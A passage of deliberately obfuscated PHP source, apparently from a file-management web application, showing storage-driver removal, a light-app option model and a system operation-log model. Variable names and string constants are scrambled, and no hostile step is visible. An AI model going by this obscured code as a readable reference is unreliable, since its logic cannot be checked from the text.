(!isset($§úŸøºÊ[$…’†Éº])) { return !1; } $àĞŸ© = $§úŸøºÊ[$…’†Éº]; if (!is_array($àĞŸ©[$‰è—”Á[6]])) { $àĞŸ©[$‰è—”Á[6]] = json_decode($àĞŸ©[$‰è—”Á[6]], !0); } return $àĞŸ©; } public function remove($«ëæŸ“ç) { $this->removeShareItems($«ëæŸ“ç); return parent::remove($«ëæŸ“ç); } public function removeWithFile($Ïœ“ÃÙô, $ì½òï÷÷, $œ±–Àâ , $Ó»¢â°¼ = false) { $×ÊÀ¸‰å =& $_SERVER[åÄ¼Ùßš]; $„åÍÁñØ = array($×ÊÀ¸‰å[919] => $Ïœ“ÃÙô); $Ù¥·â‰‰ = Model($×ÊÀ¸‰å[557])->where($„åÍÁñØ)->count(); $ñ—¾¿º„ = Model($×ÊÀ¸‰å[557])->where($„åÍÁñØ)->sum($×ÊÀ¸‰å[79]); $íÔÕô‘± = $ì½òï÷÷ . $×ÊÀ¸‰å[2382] . $Ïœ“ÃÙô; $¶‘™ŸÚ = LNG($ì½òï÷÷ == $×ÊÀ¸‰å[636] ? $×ÊÀ¸‰å[2383] : $×ÊÀ¸‰å[2384]); $Åšª†ŠÈ = new TaskFileTransfer($íÔÕô‘±, $×ÊÀ¸‰å[216], $Ù¥·â‰‰, $¶‘™ŸÚ . $×ÊÀ¸‰å[474] . $œ±–Àâ [$×ÊÀ¸‰å[32]] . $×ÊÀ¸‰å[215] . $Ïœ“ÃÙô); $Åšª†ŠÈ->task[$×ÊÀ¸‰å[857]] = (double) $ñ—¾¿º„; $øÊ»Ö¿Ì = KodIO::defaultDriver(); $¬·øÏµ = $øÊ»Ö¿Ì[$×ÊÀ¸‰å[484]]; $‰Ùéñ€ = $úÎÂ€² = $…ø¨ß°® = array(); $¡¹¶ŞÌŒ = Model($×ÊÀ¸‰å[233])->where($„åÍÁñØ)->field($×ÊÀ¸‰å[2385])->select(); foreach ($¡¹¶ŞÌŒ as $Îˆ„Ÿ¢Ù) { $óì”´É´ = $Îˆ„Ÿ¢Ù[$×ÊÀ¸‰å[554]]; if ($Ó»¢â°¼) { $úÎÂ€²[] = $óì”´É´; continue; } $ÃŞ«äĞõ = $Îˆ„Ÿ¢Ù[$×ÊÀ¸‰å[87]]; $ºÙĞÊÏ˜ = get_path_father($ÃŞ«äĞõ); $…ø¨ß°®[] = $ºÙĞÊÏ˜; $ºÙĞÊÏ˜ = str_replace("\173\151\157\x3a{$Ïœ“ÃÙô}\x7d\x2f", "\173\151\157\72{$¬·øÏµ}\x7d\x2f", $ºÙĞÊÏ˜); if (!IO::exist($ÃŞ«äĞõ)) { $‰Ùéñ€[] = $óì”´É´; $Åšª†ŠÈ->updateFileEnd($Îˆ„Ÿ¢Ù[$×ÊÀ¸‰å[32]], $Îˆ„Ÿ¢Ù[$×ÊÀ¸‰å[79]]); write_log($×ÊÀ¸‰å[2386] . $ÃŞ«äĞõ, $×ÊÀ¸‰å[1950]); continue; } $åïúûı² = IO::move($ÃŞ«äĞõ, $ºÙĞÊÏ˜, REPEAT_RENAME); if (!$åïúûı²) { $úÎÂ€²[] = $óì”´É´; $Åšª†ŠÈ->updateFileEnd($Îˆ„Ÿ¢Ù[$×ÊÀ¸‰å[32]], $Îˆ„Ÿ¢Ù[$×ÊÀ¸‰å[79]]); write_log($×ÊÀ¸‰å[2387] . $ÃŞ«äĞõ, $×ÊÀ¸‰å[1950]); continue; } $„åÍÁñØ = array($×ÊÀ¸‰å[554] => $óì”´É´); $ğˆœ¬»Ó = array($×ÊÀ¸‰å[919] => $¬·øÏµ, $×ÊÀ¸‰å[87] => $åïúûı²); Model($×ÊÀ¸‰å[233])->where($„åÍÁñØ)->save($ğˆœ¬»Ó); } $ĞÑ‹óŠè = $Åšª†ŠÈ->task; if (!$Ó»¢â°¼) { Cache::set($íÔÕô‘±, $ĞÑ‹óŠè); } $Åšª†ŠÈ->end(); $‰Ùéñ€ = array_unique($‰Ùéñ€); $úÎÂ€² = array_unique($úÎÂ€²); if (!$Ó»¢â°¼ && ($‰Ùéñ€ || $úÎÂ€²)) { $é±ÊÌ‚¡ = array(); if ($‰Ùéñ€) { $é±ÊÌ‚¡[] = sprintf(LNG($×ÊÀ¸‰å[2388]), count($‰Ùéñ€)); } if ($úÎÂ€²) { $é±ÊÌ‚¡[] = sprintf(LNG($×ÊÀ¸‰å[2389]), count($úÎÂ€²)); } $é±ÊÌ‚¡ = sprintf(LNG($×ÊÀ¸‰å[2390]), implode($×ÊÀ¸‰å[2391], $é±ÊÌ‚¡)) . $×ÊÀ¸‰å[2392] . date($×ÊÀ¸‰å[2393]) . $×ÊÀ¸‰å[2394]; if ($ì½òï÷÷ == $×ÊÀ¸‰å[1265]) { $é±ÊÌ‚¡ .= $×ÊÀ¸‰å[2395] . LNG($×ÊÀ¸‰å[2396]); } else { $é±ÊÌ‚¡ = LNG($×ÊÀ¸‰å[2397]) . $×ÊÀ¸‰å[2398] . $é±ÊÌ‚¡; } $ĞÑ‹óŠè[$×ÊÀ¸‰å[1302]] = $é±ÊÌ‚¡; Cache::set($íÔÕô‘±, $ĞÑ‹óŠè); unset($œ±–Àâ [$×ÊÀ¸‰å[6]]); $éŒšÃµ© = array($×ÊÀ¸‰å[484] => $Ïœ“ÃÙô, $×ÊÀ¸‰å[2266] => $×ÊÀ¸‰å[636], $×ÊÀ¸‰å[32] => $œ±–Àâ [$×ÊÀ¸‰å[32]], $×ÊÀ¸‰å[98] => $œ±–Àâ [$×ÊÀ¸‰å[98]]); Hook::trigger($×ÊÀ¸‰å[1828], array($×ÊÀ¸‰å[1325] => $éŒšÃµ©, $×ÊÀ¸‰å[1335] => !0)); show_json($é±ÊÌ‚¡, !1, 100111); } if ($ì½òï÷÷ == $×ÊÀ¸‰å[636]) { return !0; } if ($‰Ùéñ€ || $úÎÂ€²) { $°ş¬Ø¨ó = array_merge($‰Ùéñ€, $úÎÂ€²); $°ş¬Ø¨ó = array_filter(array_unique($°ş¬Ø¨ó)); $this->removeByFileID($°ş¬Ø¨ó); } if ($…ø¨ß°®) { $…ø¨ß°® = array_filter(array_unique($…ø¨ß°®)); foreach ($…ø¨ß°® as $ÃŞ«äĞõ) { $ºİÜÚÛƒ = IO::has($ÃŞ«äĞõ, !0); if (!$ºİÜÚÛƒ[$×ÊÀ¸‰å[242]] && !$ºİÜÚÛƒ[$×ÊÀ¸‰å[243]]) { IO::remove($ÃŞ«äĞõ); } } } return $this->remove($Ïœ“ÃÙô); } private function removeByFileID($ğı¾ıË½ = array()) { $¾ÀğÀış =& $_SERVER[åÄ¼Ùßš]; if (empty($ğı¾ıË½)) { return; } $È«ßãµø = array($¾ÀğÀış[554] => array($¾ÀğÀış[7], $ğı¾ıË½)); $Ïá¦¥Ÿ = Model($¾ÀğÀış[1466])->where($È«ßãµø)->field($¾ÀğÀış[2343])->select(); if (!$Ïá¦¥Ÿ) { return Model($¾ÀğÀış[557])->remove($ğı¾ıË½); } $Ïá¦¥Ÿ = array_to_keyvalue($Ïá¦¥Ÿ, $¾ÀğÀış[194], $¾ÀğÀış[554]); foreach ($Ïá¦¥Ÿ as $¿ÔëÖö÷ => $«©äî) { Model($¾ÀğÀış[926])->removeNow($¿ÔëÖö÷, !1); } $âÓÕó“Ò = array_diff($ğı¾ıË½, array_unique(array_values($Ïá¦¥Ÿ))); if ($âÓÕó“Ò) { return Model($¾ÀğÀış[557])->remove($âÓÕó“Ò); } } private function removeShareItems($ß„²ŞÃ) { $ü×Èµ˜Ò =& $_SERVER[åÄ¼Ùßš]; $ûÅşÛÄ = "\173\x69\x6f\x3a{$ß„²ŞÃ}\175\x2f"; $ÇîÔÍìß = array($ü×Èµ˜Ò[194] => 0, $ü×Èµ˜Ò[1295] => array($ü×Èµ˜Ò[471], "{$ûÅşÛÄ}\x25")); $ß©ŞÈ¾ = Model($ü×Èµ˜Ò[1997])->where($ÇîÔÍìß)->field($ü×Èµ˜Ò[681])->select(); if (empty($ß©ŞÈ¾)) { return; } $Ï¼§Ú = array_to_keyvalue($ß©ŞÈ¾, $ü×Èµ˜Ò[12], $ü×Èµ˜Ò[681]); Model($ü×Èµ˜Ò[680])->remove($Ï¼§Ú); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\114\151\147\150\164\x41\x70\160"; public $modelType = "\x53\171\163\164\x65\155\117\160\x74\151\157\156"; public $field = array("\156\141\155\145", "\147\162\157\165\x70", "\x64\145\x73\x63", "\x63\157\x6e\164\x65\x6e\x74"); public function listData($Î°¤ê = false, $Áæ«ò­ = "\x6d\157\144\151\146\x79\x54\x69\x6d\x65", $¹šœı½Š = true) { return parent::listData($Î°¤ê, $Áæ«ò­, $¹šœı½Š); } public function remove($ß¸¹Û©ò) { $ÅƒÑˆ = $this->findByName($ß¸¹Û©ò); if (!$ÅƒÑˆ) { return !1; } return parent::remove($ÅƒÑˆ[$_SERVER[åÄ¼Ùßš][484]]); } public function add($º»‰•‚¦) { if ($this->findByName($º»‰•‚¦[$_SERVER[åÄ¼Ùßš][32]])) { return !1; } return parent::insert($º»‰•‚¦); } public function update($ÉúÇú«, $Áù±ëÇ) { $ë¨ıÂÃ¹ =& $_SERVER[åÄ¼Ùßš]; $„ Òšó = $this->findByName($ÉúÇú«); $–š˜ø¬ = $this->findByName($Áù±ëÇ[$ë¨ıÂÃ¹[32]]); if (!$„ Òšó || $–š˜ø¬ && $–š˜ø¬[$ë¨ıÂÃ¹[484]] != $„ Òšó[$ë¨ıÂÃ¹[484]]) { return !1; } return parent::update($„ Òšó[$ë¨ıÂÃ¹[484]], $Áù±ëÇ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\163\145\162\x74", "\x66\165\156\143\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Šü¦ÎñÙ =& $_SERVER[åÄ¼Ùßš]; return array($Šü¦ÎñÙ[2399] => LNG($Šü¦ÎñÙ[2400]), $Šü¦ÎñÙ[2401] => LNG($Šü¦ÎñÙ[2402]), $Šü¦ÎñÙ[1961] => LNG($Šü¦ÎñÙ[2403]), $Šü¦ÎñÙ[2404] => LNG($Šü¦ÎñÙ[2405]), $Šü¦ÎñÙ[2406] => LNG($Šü¦ÎñÙ[2407]), $Šü¦ÎñÙ[2408] => LNG($Šü¦ÎñÙ[2409]), $Šü¦ÎñÙ[2410] => LNG($Šü¦ÎñÙ[2411]), $Šü¦ÎñÙ[1990] => LNG($Šü¦ÎñÙ[2411]), $Šü¦ÎñÙ[1991] => LNG($Šü¦ÎñÙ[2412]), $Šü¦ÎñÙ[2413] => LNG($Šü¦ÎñÙ[2414]), $Šü¦ÎñÙ[2415] => LNG($Šü¦ÎñÙ[2416]), $Šü¦ÎñÙ[2417] => LNG($Šü¦ÎñÙ[2418]), $Šü¦ÎñÙ[2419] => LNG($Šü¦ÎñÙ[2420]), $Šü¦ÎñÙ[1988] => LNG($Šü¦ÎñÙ[2421]), $Šü¦ÎñÙ[2422] => LNG($Šü¦ÎñÙ[2423]), $Šü¦ÎñÙ[1995] => LNG($Šü¦ÎñÙ[2424]), $Šü¦ÎñÙ[2425] => LNG($Šü¦ÎñÙ[2426]), $Šü¦ÎñÙ[2427] => LNG($Šü¦ÎñÙ[2428]), $Šü¦ÎñÙ[2429] => LNG($Šü¦ÎñÙ[2430]), $Šü¦ÎñÙ[2431] => LNG($Šü¦ÎñÙ[2432]), $Šü¦ÎñÙ[1998] => LNG($Šü¦ÎñÙ[2433]), $Šü¦ÎñÙ[1999] => LNG($Šü¦ÎñÙ[2434]), $Šü¦ÎñÙ[2435] => LNG($Šü¦ÎñÙ[2436]), $Šü¦ÎñÙ[2437] => LNG($Šü¦ÎñÙ[2438]), $Šü¦ÎñÙ[2439] => LNG($Šü¦ÎñÙ[2440]), $Šü¦ÎñÙ[1993] => LNG($Šü¦ÎñÙ[2441]), $Šü¦ÎñÙ[2442] => LNG($Šü¦ÎñÙ[2443]), $Šü¦ÎñÙ[1992] => LNG($Šü¦ÎñÙ[2444]), $Šü¦ÎñÙ[2445] => LNG($Šü¦ÎñÙ[2445]), $Šü¦ÎñÙ[2446] => LNG($Šü¦ÎñÙ[2447]), $Šü¦ÎñÙ[2448] => LNG($Šü¦ÎñÙ[2445]), $Šü¦ÎñÙ[2449] => LNG($Šü¦ÎñÙ[2450]), $Šü¦ÎñÙ[2451] => LNG($Šü¦ÎñÙ[2452]), $Šü¦ÎñÙ[2453] => LNG($Šü¦ÎñÙ[2452]), $Šü¦ÎñÙ[2454] => LNG($Šü¦ÎñÙ[2455]), $Šü¦ÎñÙ[2456] => LNG($Šü¦ÎñÙ[2456]), $Šü¦ÎñÙ[2457] => LNG($Šü¦ÎñÙ[1965]), $Šü¦ÎñÙ[2458] => LNG($Šü¦ÎñÙ[2459]), $Šü¦ÎñÙ[2460] => LNG($Šü¦ÎñÙ[2461]), $Šü¦ÎñÙ[2462] => LNG($Šü¦ÎñÙ[2463]), $Šü¦ÎñÙ[2464] => LNG($Šü¦ÎñÙ[2465]), $Šü¦ÎñÙ[2466] => LNG($Šü¦ÎñÙ[2467]), $Šü¦ÎñÙ[2468] => LNG($Šü¦ÎñÙ[2468]), $Šü¦ÎñÙ[2469] => LNG($Šü¦ÎñÙ[2470]), $Šü¦ÎñÙ[2471] => LNG($Šü¦ÎñÙ[2472]), $Šü¦ÎñÙ[2473] => LNG($Šü¦ÎñÙ[2474]), $Šü¦ÎñÙ[2475] => LNG($Šü¦ÎñÙ[2476]), $Šü¦ÎñÙ[2477] => LNG($Šü¦ÎñÙ[2478]), $Šü¦ÎñÙ[2479] => LNG($Šü¦ÎñÙ[2480]), $Šü¦ÎñÙ[213] => LNG($Šü¦ÎñÙ[213]), $Šü¦ÎñÙ[214] => LNG($Šü¦ÎñÙ[2481]), $Šü¦ÎñÙ[2482] => LNG($Šü¦ÎñÙ[2482])); } private function typeFile() { $Å€ñÈ§– =& $_SERVER[åÄ¼Ùßš]; $¹¿Çàú¦ = array($Å€ñÈ§–[1995] => array($Å€ñÈ§–[1996]), $Å€ñÈ§–[2417] => array($Å€ñÈ§–[2483]), $Å€ñÈ§–[2419] => array($Å€ñÈ§–[2484]), $Å€ñÈ§–[1988] => array($Å€ñÈ§–[1989], $Å€ñÈ§–[2485]), $Å€ñÈ§–[2427] => array(), $Å€ñÈ§–[2429] => array(), $Å€ñÈ§–[2431] => array(), $Å€ñÈ§–[1998] => array($Å€ñÈ§–[2000]), $Å€ñÈ§–[1999] => array($Å€ñÈ§–[2000]), $Å€ñÈ§–[2435] => array($Å€ñÈ§–[2486]), $Å€ñÈ§–[2437] => array($Å€ñÈ§–[2486]), $Å€ñÈ§–[2439] => array($Å€ñÈ§–[2487]), $Å€ñÈ§–[2425] => array($Å€ñÈ§–[2488]), $Å€ñÈ§–[1993] => array($Å€ñÈ§–[2489]), $Å€ñÈ§–[2442] => array($Å€ñÈ§–[2490]), $Å€ñÈ§–[1992] => array($Å€ñÈ§–[1994])); return $¹¿Çàú¦; } private function typeAll() { $Á¹‡·æ =& $_SERVER[åÄ¼Ùßš]; $•İ¶Ô»ò = $this->typeList; $ÈÁ²“º½ = array_filter($this->typeFile()); foreach ($ÈÁ²“º½ as $äÂÊÖĞü => $ Â ğ¿·) { $•İ¶Ô»ò[$ Â ğ¿·[0]] = $•İ¶Ô»ò[$äÂÊÖĞü]; } $•İ¶Ô»ò[$Á¹‡·æ[2000]] = LNG($Á¹‡·æ[2491]); $•İ¶Ô»ò[$Á¹‡·æ[2486]] = LNG($Á¹‡·æ[2492]); return $•İ¶Ô»ò; } public function addLog($øŞ¶Ğ¡, $Î¥Ë‡Âü = array()) { $’Ğ­‡ä¾ =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->typeList[$øŞ¶Ğ¡])) { return; } $ùã±è® = Session::get($’Ğ­‡ä¾[2157]); if (!$ùã±è®) { $ùã±è® = _get($Î¥Ë‡Âü, $’Ğ­‡ä¾[1817], 0); } if ($øŞ¶Ğ¡ == $’Ğ­‡ä¾[2458] && is_array($Î¥Ë‡Âü[$’Ğ­‡ä¾[2493]]) && !$Î¥Ë‡Âü[$’Ğ­‡ä¾[2493]]) { return; } $Ä‘¶ºáš = get_client_ip(); if (!$Î¥Ë‡Âü || strlen(json_encode($Î¥Ë‡Âü)) >= 1024 * 64) { if ($Î¥Ë‡Âü && is_array($Î¥Ë‡Âü)) { $Î¥Ë‡Âü = array_intersect_key($Î¥Ë‡Âü, array_flip($’Ğ­‡ä¾[484], $’Ğ­‡ä¾[32])); $Î¥Ë‡Âü[$’Ğ­‡ä¾[2494]] = $Ä‘¶ºáš; } else { $Î¥Ë‡Âü = array($’Ğ­‡ä¾[2494] => $Ä‘¶ºáš); } } else { if (is_array($Î¥Ë‡Âü)) { $Î¥Ë‡Âü[$’Ğ­‡ä¾[2494]] = $Ä‘¶ºáš; } else { $Î¥Ë‡Âü = array($’Ğ­‡ä¾[1325] => $Î¥Ë‡Âü, $’Ğ­‡ä¾[2494] => $Ä‘¶ºáš); } } $Î¥Ë‡Âü[$’Ğ­‡ä¾[2495]] = ACTION; $Î¥Ë‡Âü = array($’Ğ­‡ä¾[1807] => Session::sign(), $’Ğ­‡ä¾[1808] => intval($ùã±è®), $’Ğ­‡ä¾[33] => $øŞ¶Ğ¡, $’Ğ­‡ä¾[1810] => json_encode($Î¥Ë‡Âü)); Hook::trigger($’Ğ­‡ä¾[2496], $Î¥Ë‡Âü); return parent::add($Î¥Ë‡Âü); } public function remove($œ×ŞÕÒ) { $this->where(array($_SERVER[åÄ¼Ùßš][505] => $œ×ŞÕÒ))->delete(); } private function _makeOrder($ß÷ıÅ·ú = '') { $üÎäá¾» =& $_SERVER[åÄ¼Ùßš]; $¡á¬±Òà = $üÎäá¾»[234]; $°¿ò—Ç‹ = array($üÎäá¾»[534] => $üÎäá¾»[535], $üÎäá¾»[536] => $üÎäá¾»[537]); $Ë½ÚÂÛ = Input::get($üÎäá¾»[542], $üÎäá¾»[7], $üÎäá¾»[2200], array($üÎäá¾»[2112], $üÎäá¾»[536])); $Ë½ÚÂÛ = $°¿ò—Ç‹[$Ë½ÚÂÛ]; $ß÷ıÅ·ú = $ß÷ıÅ·ú . "{$¡á¬±Òà}\40{$Ë½ÚÂÛ}"; return $this->order($ß÷ıÅ·ú); } public function get($˜ğø§½ï = '') { $êİ ¾Ì =& $_SERVER[åÄ¼Ùßš]; if (!$˜ğø§½ï) { show_json(array()); } $ÎÆ¿œõ— = array(); if ($˜ğø§½ï[$êİ ¾Ì[1817]]) { $ÎÆ¿œõ—[$êİ ¾Ì[1817]] = $˜ğø§½ï[$êİ ¾Ì[1817]]; } if (isset($˜ğø§½ï[$êİ ¾Ì[854]])) { $£×»‹Áá = $˜ğø§½ï[$êİ ¾Ì[854]]; $’÷Û•‡ = isset($˜ğø§½ï[$êİ ¾Ì[855]]) ? $˜ğø§½ï[$êİ ¾Ì[855]] : time(); $ÎÆ¿œõ—[$êİ ¾Ì[234]] = array($êİ ¾Ì[410], array($£×»‹Áá, $’÷Û•‡)); } if ($˜ğø§½ï[$êİ ¾Ì[33]]) { $Ç„ı½¹ = explode($êİ ¾Ì[50], $˜ğø§½ï[$êİ ¾Ì[33]]); $¨Î§éÙ› = $this->typeFile(); $ë·ëµë¶ = array(); foreach ($Ç„ı½¹ as $ßÇÖ„æŠ) { $ë·ëµë¶[] = $ßÇÖ„æŠ; if (isset($¨Î§éÙ›[$ßÇÖ„æŠ])) { $ë·ëµë¶ = array_merge($ë·ëµë¶, $¨Î§éÙ›[$ßÇÖ„æŠ]); } } $ë·ëµë¶ = array_unique($ë·ëµë¶); if ($ë·ëµë¶) { $ÎÆ¿œõ—[$êİ ¾Ì[33]] = array($êİ ¾Ì[7], $ë·ëµë¶); } } else { $ÎÆ¿œõ—[$êİ ¾Ì[33]] = array($êİ ¾Ì[2497], $êİ ¾Ì[2498]); } if (!empty($˜ğø§½ï[$êİ ¾Ì[2494]])) { $ÎÆ¿œõ—[$êİ ¾Ì[537]] = array($êİ ¾Ì[471], "\45{$˜ğø§½ï[$êİ ¾Ì[2494]]}\x25"); } $¶“ÖÄ™ = $this->_makeOrder()->where($ÎÆ¿œõ—)->selectPage(); if (empty($¶“ÖÄ™[$êİ ¾Ì[447]])) { show_json(array(), !0, $¶“ÖÄ™[$êİ ¾Ì[444]]); } $¶“ÖÄ™[$êİ ¾Ì[447]] = $this->logList($¶“ÖÄ™[$êİ ¾Ì[447]]); return $¶“ÖÄ™; } private function ipAddress(&$ÏëÓŞäë) { $ÍÍŸ“· =& $_SERVER[åÄ¼Ùßš]; if (!empty($ÏëÓŞäë[$ÍÍŸ“·[2494]])) { $ñ‰ã§¾¿ = IpLocation::get($ÏëÓŞäë[$ÍÍŸ“·[2494]]); } else { $ñ‰ã§¾¿ = LNG($ÍÍŸ“·[2499]); } $ÏëÓŞäë[$ÍÍŸ“·[2500]] = $ñ‰ã§¾¿; } private function descZipDownload($ÁÙóàü, &$´ŸºÎ™Ó) { $Ö³Ÿ‹ì™ =& $_SERVER[åÄ¼Ùßš]; if (!isset($ÁÙóàü[$Ö³Ÿ‹ì™[2501]])) { return; } $ÅÓêô¿ = json_decode($ÁÙóàü[$Ö³Ÿ‹ì™[2501]], !0); foreach ($ÅÓêô¿ as $§§ìËûÛ) { try { $ùçÖâÄ = IO::infoFullSimple($§§ìËûÛ[$Ö³Ÿ‹ì™[87]]); } catch (Exception $é¥•ƒÍÓ) { continue; } $ÁÙóàü[$Ö³Ÿ‹ì™[87]] = $§§ìËûÛ[$Ö³Ÿ‹ì™[87]]; $´ŸºÎ™Ó[] = $ÁÙóàü[$Ö³Ÿ‹ì™[194]] = $ùçÖâÄ[$Ö³Ÿ‹ì™[194]]; $´ŸºÎ™Ó[] = $ÁÙóàü[$Ö³Ÿ‹ì™[2261]] = $ùçÖâÄ[$Ö³Ÿ‹ì™[193]]; break; } return $ÁÙóàü; } private function getSourceList(&$˜‡éí˜) { $¿À†¢Ğõ =& $_SERVER[åÄ¼Ùßš]; $±—¥‹Ø = array(); foreach ($˜‡éí˜ as $òéÃ£¡ç => $ÎæáæÇ) { $àÏ™¤ú‰ = json_decode($ÎæáæÇ[$¿À†¢Ğõ[537]], !0); if ($ÎæáæÇ[$¿À†¢Ğõ[33]] == $¿À†¢Ğõ[1991]) { $àÏ™¤ú‰ = $this->descZipDownload($àÏ™¤ú‰, $±—¥‹Ø); $˜‡éí˜[$òéÃ£¡ç][$¿À†¢Ğõ[537]] = json_encode($àÏ™¤ú‰); continue; } if (strpos($ÎæáæÇ[$¿À†¢Ğõ[33]], $¿À†¢Ğõ[2263]) !== 0) { if (!isset($àÏ™¤ú‰[$¿À†¢Ğõ[87]]) || strpos($ÎæáæÇ[$¿À†¢Ğõ[33]], $¿À†¢Ğõ[2502]) !== 0) { continue; } try { $“®ƒ¼ä = IO::infoFullSimple($àÏ™¤ú‰[$¿À†¢Ğõ[87]]); } catch (Exception $Ûİ¹ÛÓÔ) { continue; } $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[194]] = $“®ƒ¼ä[$¿À†¢Ğõ[194]]; $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[2261]] = $“®ƒ¼ä[$¿À†¢Ğõ[193]]; $˜‡éí˜[$òéÃ£¡ç][$¿À†¢Ğõ[537]] = json_encode($àÏ™¤ú‰); continue; } $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[194]]; $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[2261]]; if ($àÏ™¤ú‰[$¿À†¢Ğõ[33]] == $¿À†¢Ğõ[636]) { $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[537]][$¿À†¢Ğõ[1277]]; $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[537]][$¿À†¢Ğõ[1278]]; } if ($àÏ™¤ú‰[$¿À†¢Ğõ[33]] == $¿À†¢Ğõ[2272]) { $±—¥‹Ø[] = $àÏ™¤ú‰[$¿À†¢Ğõ[537]][$¿À†¢Ğõ[194]]; } } if (!$±—¥‹Ø) { return array(); } return Model($¿À†¢Ğõ[926])->sourceListInfo($±—¥‹Ø, !0); } private function logList($…ïšğ•Å) { $”é˜Óœá =& $_SERVER[åÄ¼Ùßš]; $¦ŠçÛõÂ = array_to_keyvalue($…ïšğ•Å, $”é˜Óœá[12], $”é˜Óœá[1817]); $…ÊÍÓ–Š = Model($”é˜Óœá[610])->userListInfo(array_unique($¦ŠçÛõÂ)); $Ë÷‰Ê°” = $this->getSourceList($…ïšğ•Å); $ÂŞê‚ê÷ = $this->typeAll(); $¸â¶§¾£ = array(); $®ùñöçş = array(); foreach ($…ïšğ•Å as $Î Óäë => $–ŠĞÉ¿Ã) { $…¶—Ê¢ = $–ŠĞÉ¿Ã[$”é˜Óœá[33]]; $´İ²» = isset($…ÊÍÓ–Š[$–ŠĞÉ¿Ã[$”é˜Óœá[1817]]]) ? $…ÊÍÓ–Š[$–ŠĞÉ¿Ã[$”é˜Óœá[1817]]] : !1; $”Ååç¨õ = strpos($…¶—Ê¢, $”é˜Óœá[2503]) === 0 ? LNG($”é˜Óœá[2504]) : LNG($”é˜Óœá[2499]); $–ŠĞÉ¿Ã[$”é˜Óœá[32]] = isset($´İ²»[$”é˜Óœá[32]]) ? $´İ²»[$”é˜Óœá[32]] : LNG($”é˜Óœá[2499]); $–ŠĞÉ¿Ã[$”é˜Óœá[2323]] = isset($´İ²»[$”é˜Óœá[2323]]) ? $´İ²»[$”é˜Óœá[2323]] : $”é˜Óœá[12]; $–ŠĞÉ¿Ã[$”é˜Óœá[1704]] = isset($ÂŞê‚ê÷[$…¶—Ê¢]) ? $ÂŞê‚ê÷[$…¶—Ê¢] : $”Ååç¨õ; $–ŠĞÉ¿Ã[$”é˜Óœá[2199]] = $´İ²»; $íÙéŸŒİ = json_decode($–ŠĞÉ¿Ã[$”é˜Óœá[537]], !0); $–ŠĞÉ¿Ã[$”é˜Óœá[2494]] = isset($íÙéŸŒİ[$”é˜Óœá[2494]]) ? $íÙéŸŒİ[$”é˜Óœá[2494]] : $”é˜Óœá[12]; $–ŠĞÉ¿Ã[$”é˜Óœá[2500]] = IpLocation::get($–ŠĞÉ¿Ã[$”é˜Óœá[2494]]); if (strpos($…¶—Ê¢, $”é˜Óœá[2263]) === 0 || isset($íÙéŸŒİ[$”é˜Óœá[2261]])) { $íÙéŸŒİ[$”é˜Óœá[90]] = $Ë÷‰Ê°”[$íÙéŸŒİ[$”é˜Óœá[194]]]; $íÙéŸŒİ[$”é˜Óœá[2277]] = $Ë÷‰Ê°”[$íÙéŸŒİ[$”é˜Óœá[2261]]]; if ($íÙéŸŒİ[$”é˜Óœá[33]] == $”é˜Óœá[636]) { $íÙéŸŒİ[$”é˜Óœá[537]][$”é˜Óœá[1277]] = $Ë÷‰Ê°”[$íÙéŸŒİ[$”é˜Óœá[537]][$”é˜Óœá[1277]]]; $íÙéŸŒİ[$”é˜Óœá[537]][$”é˜Óœá[1278]] = $Ë÷‰Ê°”[$íÙéŸŒİ[$”é˜Óœá[537]][$”é˜Óœá[1278]]]; } if ($íÙéŸŒİ[$”é˜Óœá[33]] == $”é˜Óœá[2272]) { $íÙéŸŒİ[$”é˜Óœá[537]][$”é˜Óœá[194]] = $Ë÷‰Ê°”[$íÙéŸŒİ[$”é˜Óœá[537]][$”é˜Óœá[194]]]; } if ($íÙéŸŒİ[$”é˜Óœá[33]] == $”é˜Óœá[1265]) { $íÙéŸŒİ[$”é˜Óœá[2277]] = $íÙéŸŒİ[$”é˜Óœá[90]]; $íÙéŸŒİ[$”é˜Óœá[2261]] = $íÙéŸŒİ[$”é˜Óœá[2277]][$”é˜Óœá[194]]; $íÙéŸŒİ[$”é˜Óœá[90]] = !1; $íÙéŸŒİ[$”é˜Óœá[194]] = $”é˜Óœá[12]; } $íğñüòÁ = array($”é˜Óœá[1265], $”é˜Óœá[2259]); if (!in_array($íÙéŸŒİ[$”é˜Óœá[33]], $íğñüòÁ)) { if ($íÙéŸŒİ[$”é˜Óœá[90]] && $íÙéŸŒİ[$”é˜Óœá[90]][$”é˜Óœá[191]] == $”é˜Óœá[192]) { $®ùñöçş[] = $–ŠĞÉ¿Ã[$”é˜Óœá[484]]; unset($…ïšğ•Å[$Î Óäë]); continue; } if ($íÙéŸŒİ[$”é˜Óœá[2277]] && $íÙéŸŒİ[$”é˜Óœá[2277]][$”é˜Óœá[191]] == $”é˜Óœá[192]) { $®ùñöçş[] = $–ŠĞÉ¿Ã[$”é˜Óœá[484]]; unset($…ïšğ•Å[$Î Óäë]); continue; } } } $–ŠĞÉ¿Ã[$”é˜Óœá[537]] = $íÙéŸŒİ; unset($–ŠĞÉ¿Ã[$”é˜Óœá[2505]]); $¸â¶§¾£[] = $–ŠĞÉ¿Ã; } $this->clearSystemPathLog($®ùñöçş); return $¸â¶§¾£; } private function clearSystemPathLog($ä¢ î¤) { $–Ö‹„³ =& $_SERVER[åÄ¼Ùßš]; if (count($ä¢ î¤) == 0) { return; } $”›¯ Ş = array($–Ö‹„³[484] => array($–Ö‹„³[7], array_unique($ä¢ î¤))); $this->where($”›¯ Ş)->delete(); } public function deviceList($ô½ğÂŠ, $ŠÃ¯„âÊ = 0) { $‚£ïÚøÓ =& $_SERVER[åÄ¼Ùßš]; $ ×Ø££— = array($‚£ïÚøÓ[1817] => $ô½ğÂŠ, 